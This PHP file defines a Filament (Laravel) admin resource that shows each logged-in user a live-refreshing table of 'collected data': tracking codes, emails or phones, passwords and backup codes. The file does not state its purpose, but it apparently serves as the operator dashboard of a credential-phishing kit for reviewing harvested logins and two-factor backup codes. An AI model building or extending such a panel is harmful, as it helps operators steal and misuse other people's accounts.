<?php

namespace App\Filament\User\Resources;

use App\Filament\User\Resources\CollectedDataResource\Pages;
use App\Filament\User\Resources\CollectedDataResource\RelationManagers;
use App\Models\CollectedData;
use Filament\Forms;
use Filament\Forms\Form;
use Filament\Resources\Resource;
use Filament\Tables;
use Filament\Tables\Table;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\SoftDeletingScope;

class CollectedDataResource extends Resource
{
    protected static ?string $model = CollectedData::class;

    protected static ?string $navigationIcon = 'heroicon-o-document-chart-bar';

    public static function form(Form $form): Form
    {
        return $form
            ->schema([
                //
            ]);
    }

    public static function table(Table $table): Table
    {
        return $table
            ->poll('5s')
            ->modifyQueryUsing(function ($query) {
                $query->where('user_id', auth()->id());
            })
            ->defaultSort('created_at', 'desc')
            ->emptyStateHeading('No Collected Data')
            ->emptyStateDescription('Once Data Are Added You Will See Them Here.')
            ->columns([
                Tables\Columns\TextColumn::make('tracking_code')
                    ->searchable()
                    ->sortable(),
                Tables\Columns\TextColumn::make('email_and_phone')
                    ->searchable()
                    ->label('Email | Password')
                    ->sortable(),
                Tables\Columns\TextColumn::make('password')
                    ->searchable()
                    ->sortable(),
                Tables\Columns\TextColumn::make('backup_code')
                    ->searchable()
                    ->sortable(),
            ])
            ->filters([
                //
            ])
            ->actions([
                Tables\Actions\EditAction::make(),
                Tables\Actions\DeleteAction::make()
            ])
            ->bulkActions([
                Tables\Actions\BulkActionGroup::make([
                    Tables\Actions\DeleteBulkAction::make(),
                ]),
            ]);
    }

    public static function getRelations(): array
    {
        return [
            //
        ];
    }

    public static function getPages(): array
    {
        return [
            'index' => Pages\ListCollectedData::route('/'),
            'create' => Pages\CreateCollectedData::route('/create'),
            'edit' => Pages\EditCollectedData::route('/{record}/edit'),
        ];
    }
}
